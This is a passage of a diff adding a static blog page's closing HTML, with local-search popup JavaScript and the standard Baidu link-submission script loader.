+                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                            });
+
+                            str += "<p class=\"search-result\">" + match_content +"...</p>"
+                        }
+                        str += "</li>";
+                    }
+                })};
+                str += "</ul>";
+                if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+                if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+                $resultContent.innerHTML = str;
+            });
+            proceedsearch();
+        }
+    });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+
+</body>
+</html>
